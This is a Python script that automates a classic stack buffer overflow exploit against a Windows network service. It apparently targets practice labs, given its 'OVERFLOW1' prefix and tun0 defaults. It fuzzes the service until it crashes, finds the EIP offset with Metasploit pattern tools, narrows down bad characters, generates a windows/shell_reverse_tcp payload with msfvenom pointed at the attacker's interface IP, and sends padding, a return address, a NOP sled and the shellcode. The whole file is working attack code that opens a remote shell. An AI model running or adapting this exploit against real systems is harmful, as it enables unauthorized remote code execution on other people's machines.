import binascii
import os
import socket
import struct
import subprocess
import time

from typing import Union


def execute(command: str) -> None:
    """function to execute command and print out the command"""
    print(f"[+] Executing: {command}")
    os.system(command)


def send_data(data: Union[bytes, str], timeout: int = 5) -> None:
    """function to send bytes to the target"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((ip, port))
    print("[+] Received: ", s.recv(1024).decode())

    if type(data) == str:
        data = data.encode()
    s.send(data)

    print("[+] Received: ", s.recv(1024).decode())
    s.close()


def fuzz(start: int = 100, end: int = 10000) -> int:
    """fuzz the application with increasing size of buffer"""
    try:
        while start <= end:
            fuzz_str = "A" * start
            print("[+] Fuzzing with %s bytes" % len(fuzz_str))
            send_data(prefix + fuzz_str.encode() + suffix)
            time.sleep(1)
            start += 100
    except ConnectionRefusedError:
        print("[-] Connection refused")
    except socket.timeout:
        offset = start
        print(f"[!] crashed at: {offset}")
        return offset


def send_cyclic(offset: int) -> int:
    """Cyclic pattern to send to the app, and check for the exact pattern"""
    print("\n[+] Creating cyclic pattern with offset")
    command = f"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {offset} > pattern.buf"
    execute(command)
    buffer = open("pattern.buf", "r").read()
    input("[~] Press enter to send cyclic pattern (restart the app)")

    try:
        send_data(prefix + buffer.encode() + suffix)
    except socket.timeout:
        print("[~] Crashed the app, check the EIP")

    eip = input("[?] Enter EIP value: ")

    command = f"/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q {eip.strip()}" + " | awk '{print $6}' > /tmp/offset"
    execute(command)

    with open("/tmp/offset", "r") as fp:
        content = fp.read()
        if content == "":
            print("[-] Unable to get a match")
            exit()
        else:
            offset = content.strip("\n")
            print(f"[+] Offset found at address {offset}")
            return int(offset)


def generate_chars(badchars: [str]) -> bytes:
    """
    generate all chars after filtering out badchars
    :param badchars: ["\\x0a", "\\x0d"]
    :return: "0102.."
    """
    char_str = ""

    for x in range(1, 256):
        current_char = "\\x" + '{:02x}'.format(x)

        if current_char not in badchars:
            char_str += current_char[2:]
            # remove the leading "\x"
    return binascii.unhexlify(char_str)


def badchars_esp(offset: int) -> str:
    input("\n[+] Press enter to send bad chars (restart the app)")
    print("[!] pro tip: !mona bytearray -f \"\\x00\"")

    # default badchar as \x00
    current_badchars = ["\\x00"]

    while True:
        # convert the hexstring into binary
        allchars = generate_chars(current_badchars)

        padding = "A" * offset
        eip = "B" * 4
        esp = "C" * 8

        buffer = padding.encode() + eip.encode() + allchars

        try:
            print("[?] Sending buffer")
            send_data(prefix + buffer + suffix)
        except socket.timeout:
            print("\n[+] allchars sent")

        print("[+] current_badchars: ", current_badchars)
        print("[!] pro tip: !mona compare -f c:\\path\\bytearray.bin -a esp")
        command = input("[+] Enter badchar (\\x00 \\x01 ..) to filter out (type 'exit' to skip): ").strip()
        if command == "exit":
            break
        elif " " in command:
            current_badchars.extend(command.split(" "))
        elif command != "":
            current_badchars.append(command)

    print("[+] Badchars detected: ", "".join(current_badchars))
    return "".join(current_badchars)


def badchars_not_esp(offset: int) -> str:
    current_badchars = ["\\x00"]

    while True:
        # convert the hexstring into binary
        allchars = generate_chars(current_badchars)

        number = input("[+] Enter amount to send (enter to sendall, exit to end): ").strip()
        if number == "exit":
            break
        elif number == "":
            number = len(allchars)

        bindex = int(number)
        if bindex > len(allchars):
            bindex = len(allchars)

        # steps, send all 255, does it crash?

        padding = "A" * offset
        eip = "B" * 4
        esp = "C" * 8

        # buffer not in ESP
        buffer = allchars[:bindex] + padding[len(allchars[:bindex]):].encode() + eip.encode() + esp.encode()

        try:
            send_data(prefix + buffer + suffix)
        except socket.timeout:
            print("\n[+] allchars sent")

        print("[+] current_badchars: ", current_badchars)
        command = input("[+] Enter badchar to filter out (enter to skip): ").strip()
        if command == "exit":
            break
        elif " " in command:
            current_badchars.extend(command.split(" "))
        elif command != "":
            current_badchars.append(command)

    print("[+] Badchars detected: ", "".join(current_badchars))
    return "".join(current_badchars)


def shell_gen(badchars: str):
    """Generates the shellcode using the vpn tunnel ip address"""
    execute(f"ip addr show {interface} | grep 'inet ' | " + "awk '{print $2}' | cut -d'/' -f1 > /tmp/ip")
    ip = open("/tmp/ip", "r").read().strip()
    print(f"[+] IP Detected: {ip}")

    command = f"msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={rport} EXITFUNC=thread -b \"{badchars}\" -f raw > /tmp/shellcode 2>/dev/null"
    execute(command)
    print("[+] Generated shellcode at /tmp/shellcode")


def exploit(offset):
    eip_str = input("[+] Enter EIP address to overwrite (without 0x): ").strip()

    padding = "A" * offset
    eip = struct.pack("<I", int(eip_str, 16))
    nops = binascii.unhexlify("90" * 32)

    shellcode = open("/tmp/shellcode", "rb").read()
    print(f"[+] Loaded shellcode of size: {len(shellcode)} bytes")

    # only if first stage payload required
    # from pwn import asm
    #  register = input("Enter payload register (esp): ").strip()
    #  assembly = asm(f"jmp {register}; add eax, 4")
    #  padding_offset = len(padding) - len(nops) + len(shellcode)
    #  buffer = nops + shellcode + padding[padding_offset:].encode() + eip + esp.encode()

    try:
        buffer = padding.encode() + eip + nops + shellcode
        print("[=] Buffer to be sent: ", buffer)
        print("[+] exploiting.. ")
        send_data(prefix + buffer + suffix)
    except socket.timeout:
        print("[+] Payload sent but timed out")

    print("[+] Exploitation completed")


def check_esp(offset: int) -> None:
    """function check if esp has large enough room for shelllcode"""
    padding = "A" * offset
    eip = "B" * 4
    esp = "C" * 500

    input("[=] Enter to send huge buffer (500 bytes of C) to check for space on ESP")
    buffer = padding.encode() + eip.encode() + esp.encode()

    try:
        print("[?] Sending buffer")
        send_data(prefix + buffer + suffix)
    except socket.timeout:
        print("[+] buffer sent, check for the ESP register content")


def main() -> None:
    """main function to start the exploit"""

    offset = fuzz()
    offset = send_cyclic(offset)
    check_esp(offset)

    question = input("[?] Is the payload enough to be sent in ESP (y/n): ").strip()
    payload_in_esp = question.lower() == "y"

    if payload_in_esp:
        badchars = badchars_esp(offset)
    else:
        badchars = badchars_not_esp(offset)

    shell_gen(badchars)
    exploit(offset)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description = "Buffer overflow exploit testing tool")
    parser.add_argument("--prefix", help = "prefix of the string to send", default = "OVERFLOW1")
    parser.add_argument("--suffix", help = "suffix of the string to send", default = "\r\n")
    parser.add_argument("--ip", help = "target ip address", required = True)
    parser.add_argument("--port", help = "target port to exploit", required = True)
    parser.add_argument("--rport", help = "reverse shell port", default = 443)
    parser.add_argument("--interface", help = "the interface to use", default = "tun0")

    args = parser.parse_args()

    global ip, port, timeout, prefix, suffix, rport, interface
    ip: str = args.ip
    port: int = int(args.port)
    rport: int = int(args.rport)
    timeout: int = 5
    prefix: bytes = args.prefix.encode()
    suffix: bytes = args.suffix.encode()
    interface: str = args.interface

    main()
